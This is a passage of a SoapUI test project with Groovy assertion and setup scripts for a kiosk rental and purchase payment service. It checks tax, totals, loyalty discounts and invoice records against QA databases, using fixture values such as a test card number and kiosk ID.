def actualRentalTaxRate = holder.getNodeValue("//RENTALTAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxRate = holder.getNodeValue("//PURCHASETAXRATE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualGrandTotal = holder.getNodeValue("//GRANDTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualDiscountedSubTotal = holder.getNodeValue("//DISCOUNTEDSUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSubTotal = holder.getNodeValue("//SUBTOTAL[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualAuthAmount = holder.getNodeValue("//AUTHAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPromotionValue = holder.getNodeValue("//PROMOTIONVALUE[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualSalesTaxAmount = holder.getNodeValue("//SALESTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualShoppingCartType = holder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();
def actualRentalType = holder.getNodeValue("//RENTALTYPE[1]").toInteger();
def actualIsOffline = holder.getNodeValue("//ISOFFLINE[1]").toInteger();

//Get the expected values from TestCase properties; calculated in "Encoded Message Body (Authorize)"
def expectedRentalTaxAmount = context.expand( '${#TestCase#RentalTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxAmount = context.expand( '${#TestCase#PurchaseTaxAmount}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedRentalTaxRate = context.expand( '${#TestCase#RentalTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPurchaseTaxRate = context.expand( '${#TestCase#PurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDigitalPurchaseTaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedGrandTotal = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedDiscountedSubTotal = context.expand( '${#TestCase#DiscountedSubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSubTotal = context.expand( '${#TestCase#SubTotal}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedPromotionValue = context.expand( '${#TestCase#PromoValue}' ).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def expectedSalesTaxAmount = (expectedRentalTaxAmount + expectedPurchaseTaxAmount).toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);

//Validations
// rental type is 1 if online and 2 if offline (3 is web)
assert (actualRentalType == 1);
assert (actualIsOffline == 0);
assert (actualDiscountedSubTotal == expectedDiscountedSubTotal);
assert (actualGrandTotal == expectedGrandTotal);
assert (actualSubTotal == expectedSubTotal);
assert (actualAuthAmount == expectedGrandTotal);
assert (actualPromotionValue == expectedPromotionValue);
assert (actualSalesTaxAmount == expectedSalesTaxAmount);
//amounts will be 0 if there were none of that type
if (numRentals == 0) 
{
	assert actualRentalTaxAmount.toBigDecimal() == 0;
	assert actualRentalTaxRate == 0;
} 
else 
{
	assert actualRentalTaxAmount.toBigDecimal() == expectedRentalTaxAmount.toBigDecimal();
	assert actualRentalTaxRate == expectedRentalTaxRate;	
}
//amounts will be 0 if there were none of that type
if (numPurchases == 0) 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == 0;
	assert actualPurchaseTaxRate == 0;
} 
else 
{
	assert actualPurchaseTaxAmount.toBigDecimal() == expectedPurchaseTaxAmount.toBigDecimal();
	if (HasPhysicalPurchase == 'true')
	{
		assert actualPurchaseTaxRate == expectedPurchaseTaxRate;
	}
	else
	{
		assert actualPurchaseTaxRate == expectedDigitalPurchaseTaxRate;
	}
	
}
// 1 = only rentals, 2 = only purchases, 3 = both
if (numRentals > 0 &amp;&amp; numPurchases == 0)
	assert actualShoppingCartType == 1
else if (numRentals == 0 &amp;&amp; numPurchases > 0)
	assert actualShoppingCartType == 2
else
	assert actualShoppingCartType == 3
	</scriptText></con:configuration></con:assertion><con:assertion type="XPath Match" id="6d8ac62a-fe7e-4618-977f-63861f2c2f20" name="Match content of [TRANSACTION_STATUS]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="d1b45fee-cd43-4f09-b272-367adbe8f895" name="Match content of [KIOSKCLIENT_ID]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/KIOSKCLIENT_ID[1]/text()</path><content>${#TestCase#KioskId}</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:properties><con:property><con:name>TnxId</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check AmountBase" id="7777d160-b76d-48f3-89a2-f0931316a0d9" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT 
	sum(amountbase) as totalAmountBase
FROM
	[InvoiceItem]
WHERE 
	Invoice = :InvoiceID
AND
	label = 1</con:query><con:assertion type="GroovyScriptAssertion" id="859a2ef5-91d6-4cb1-aecf-9b4c52dd67ec" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def holder = groovyUtils.getXmlHolder( "Check AmountBase#ResponseAsXml");
def actualAmountBase = holder.getNodeValue("//TOTALAMOUNTBASE[1]").toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def expectedAmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);

assert (actualAmountBase == expectedAmountBase);</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="2ac2124c-05f5-447a-8fb8-94417c51ddea" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status], 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Invoice Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="Script Assertion"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();

//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if (shoppingCartType == 3)
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Auth Completed" id="72cf22b6-856d-415b-85d5-67d23b74fe76" disabled="true"><con:settings/><con:config><script/></con:config></con:testStep><con:testStep type="groovy" name="Groovy Script" id="85cf6f05-64d0-46c7-b0f2-4801c185bfaf" disabled="true"><con:settings/><con:config><script>def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
loyaltyFlagList = loyaltyFlag.split(",");
loyaltyProductId = [];
loyaltyProductPrice = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];
BigDecimal DiscountedSubTotal = 0;
BigDecimal EstimatedLoyaltyAmount = 0;
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
rentalTitleIds = [1136, 1472, 4207]
rentalDiscPrice = [1.50, 1.50, 2.00]
remainingTitles = []

if (loyaltyFlag == "")
{
	testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
	testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
}
else
{
	loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	for (l = 0; l &lt; loyaltyFlagList.size(); l++)
	{
	    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
		curLoyaltyTitle = loyaltyTitleList[l].toString().trim();
		curLoyaltyPrice = loyaltyTitlePrice[l].toString().trim();
	    	log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice");
	    	if (curLoyaltyFlag == '1')
	    	{
	    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
	    	loyaltyPayload += "{"; 
		loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
		loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
		loyaltyPayload += "\"PromotionCode\": null,";
		//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
		//promoPayload += "\"RedemptionPoints\": null,";
		loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
		loyaltyPayload += "}"; 
		//Calculate Loyalty Total
		EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
		loyaltyProductId.add(curLoyaltyTitle);
	    	loyaltyProductPrice.add(curLoyaltyPrice);
	    	log.info ("loyaltyPayload: $loyaltyPayload");
	    	
	    	}
	    	else if (curLoyaltyFlag == "0")
	    	{
	    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	    		nonLoyaltyProductId.add(curLoyaltyTitle);
	    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
	    		log.info ("Flag is 0");
	    	}
	    	if (l+1 &lt; loyaltyFlagList.size())
	      {
	      		if (curLoyaltyFlag == '1')
	      		{
	      			loyaltyPayload += ","
	      		}
	      		else
	      		{
	      			//None as of Now
	      		}
	      		     	
	      }
	} 
	testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
	testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
	testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
	testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
}</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value/></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>CCNumber</con:name><con:value>4847354422892240</con:value></con:property><con:property><con:name>CCType</con:name><con:value>5</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>68327744671161</con:value></con:property><con:property><con:name>DigitalpurchaseTaxAmt</con:name><con:value>0</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.8800</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.9990</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.loyalty@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value/></con:property><con:property><con:name>numOfPurchases</con:name><con:value/></con:property><con:property><con:name>RentalFormats</con:name><con:value>1,2</con:value></con:property><con:property><con:name>numOfRentals</con:name><con:value>1,1</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>null</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value>000150501,000150505,000150508</con:value></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value>Movies,Movies,Movies</con:value></con:property><con:property><con:name>PurchaseProductType</con:name><con:value>DVD,DVD,DVD</con:value></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value>8,8,8</con:value></con:property><con:property><con:name>purchasePayload</con:name><con:value>{"GroupType" : "Purchase",  "Items" : [{"ProductId" : 986,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"Pricing" : {"Purchase" : 8,"Expiration" : 8,"PriceSetId" : 1,"ProductPriceId" : 1}},{"ProductId" : 1494,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"Pricing" : {"Purchase" : 8,"Expiration" : 8,"PriceSetId" : 1,"ProductPriceId" : 1}},{"ProductId" : 1166,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"Pricing" : {"Purchase" : 8,"Expiration" : 8,"PriceSetId" : 1,"ProductPriceId" : 1}}],"Totals" : { "TaxRate" : 8.8800, "Subtotal" : 24,"DiscountedSubtotal" : 24,"TaxAmount" : 2.1312,"GrandTotal" : 26.1312 } }</con:value></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>000150501,000150511</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Movies,Movies</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>DVD,Blu-ray</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>1.75,2.00</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>28.00,32.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>16,16</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : "Rental",  "Items" : [{"ProductId" : 986,"ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"Pricing" : {"InitialNight" : 1.75,"ExtraNight" : 1.75,"NonReturn" : 28.00,"Expiration" : 1.75,"NonReturnDays" : 16,"PriceSetId" : 1,"ProductPriceId" : 1,"InitialDays" : 1,"DefaultInitialNight" : 1.75,"DefaultExtraNight" : 1.75}},{"ProductId" : 1943,"ProductFamily" : "Movies","ProductType" : "Blu-ray","MultiDisc" : false,"Pricing" : {"InitialNight" : 2.00,"ExtraNight" : 2.00,"NonReturn" : 32.00,"Expiration" : 2.00,"NonReturnDays" : 16,"PriceSetId" : 1,"ProductPriceId" : 1,"InitialDays" : 1,"DefaultInitialNight" : 2.00,"DefaultExtraNight" : 2.00}}],"Totals" : { "TaxRate" : 9.9990,"Subtotal" : 3.75 ,"DiscountedSubtotal" : 3.75,"TaxAmount" : 0.37,"GrandTotal" : 4.12} }</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value>0.37</con:value></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>4.12</con:value></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value>3.75</con:value></con:property><con:property><con:name>SubTotal</con:name><con:value>3.75</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>986,1943</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value>986,1494,1166</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%22aded6bab-b433-4066-8782-621f9bc18edf%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22MessageType%22%3A+%22EstimateAccrual%22%2C%22CustomerProfileNumber%22%3A+%2268327744671161%22%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+%22Rental%22%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+986%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.75%2C%22ExtraNight%22+%3A+1.75%2C%22NonReturn%22+%3A+28.00%2C%22Expiration%22+%3A+1.75%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+1%2C%22ProductPriceId%22+%3A+1%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+1.75%2C%22DefaultExtraNight%22+%3A+1.75%7D%7D%2C%7B%22ProductId%22+%3A+1943%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22Blu-ray%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+2.00%2C%22ExtraNight%22+%3A+2.00%2C%22NonReturn%22+%3A+32.00%2C%22Expiration%22+%3A+2.00%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+1%2C%22ProductPriceId%22+%3A+1%2C%22InitialDays%22+%3A+1%2C%22DefaultInitialNight%22+%3A+2.00%2C%22DefaultExtraNight%22+%3A+2.00%7D%7D%5D%2C%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.9990%2C%22Subtotal%22+%3A+3.75+%2C%22DiscountedSubtotal%22+%3A+3.75%2C%22TaxAmount%22+%3A+0.37%2C%22GrandTotal%22+%3A+4.12%7D+%7D%5D%2C%22Discounts%22%3A+%5B%5D%7D%7D+</con:value></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>0</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value>986,1943</con:value></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value>1.75,2.00</con:value></con:property><con:property><con:name>testBucket</con:name><con:value/></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value>986,1943</con:value></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value>1.75,2.00</con:value></con:property><con:property><con:name>EAMessageId</con:name><con:value>aded6bab-b433-4066-8782-621f9bc18edf</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>86b29e8b-9449-4b42-a501-717ac5b2bccc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>aee6dc73-e1a0-4123-aabd-fcd972f9608d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="EstimateRedemption" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="982d84cf-ed8c-41a1-99ad-c0e6a626a846"><con:description/><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="5ff61de2-5e40-40b6-85c3-723b24283d2b"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() As CurrentDate</con:query><con:assertion type="JDBC Status" id="5897a997-f0a8-4714-b2ed-24087b99e9b6" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (EstimateRedemption)" id="f20c6372-4a0f-4ec4-ab2f-9c52da5687db"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.##"); //Rounding the amount to 2 decimals.
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' )

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types; build the lists. 
rentalBarcodes = [];
purchaseBarcodes = [];
rentalProductFamily = [];
purchaseProductFamily = [];
rentalProductType = [];
purchaseProductType = [];
rentalDiscPrice = [];
purchaseDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
loyaltyProductId = [];
loyaltyProductPrice = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];

//NEW
rentalTitleIds = []; //will have both rental and purchase titleIds.
purchaseTitleIds = [];

//Payload building and Amount Calculations
//Rental Items Payload
rentalPayload = "{\"GroupType\" : \"Rental\",  \"Items\" : [";
BigDecimal rentalTotal = 0;
//Purchase Items Payload
purchasePayload = "{\"GroupType\" : \"Purchase\",  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
int rentalCount = 0;
int purchaseCount = 0;
BigDecimal SubTotal = 0;
BigDecimal DiscountedSubTotal = 0;
BigDecimal EstimatedLoyaltyAmount = 0;
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
requestPayload = ""; //Total payload rental + purchase + promo + loyalty

//Creating a Boolean
HasPhysicalPurchase = 'false';
testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);

//Get to-do Rental info
def numAddRentals = Eval.me("[" + context.expand( '${#TestCase#numOfRentals}' ) + "]");
def numAddPurchases = Eval.me("[" + context.expand( '${#TestCase#numOfPurchases}' ) + "]");
def PromoCode = context.expand( '${#TestCase#PromoCode}');
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
purchaseformatIDList = purchaseFormatIds.split(",");
rentalformatIDList = rentalFormatIds.split(",");
loyaltyFlagList = loyaltyFlag.split(",");
int numberOfLoyaltyFlags = Eval.me("[" + loyaltyFlag + "]").count {it == 1};

//TO-DO STILL THERE IS A FLAW IN THIS LOGIC. NEED TO FIGURE OUT THE SOLUTION.
//Purpose: If datasource says rent Dvd, Bluray and provide quantity for only Dvd and not for Bluray; currently it fail with array out of bound error.
//For Rentals
if (rentalformatIDList.size() != numAddRentals.size())
{
    def difference = (rentalformatIDList.size() - numAddRentals.size())
     for (di = 0; di < difference; di++)
     {
         numAddRentals.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else
{
     //nothing to do, code looks good
}
//For Purchases
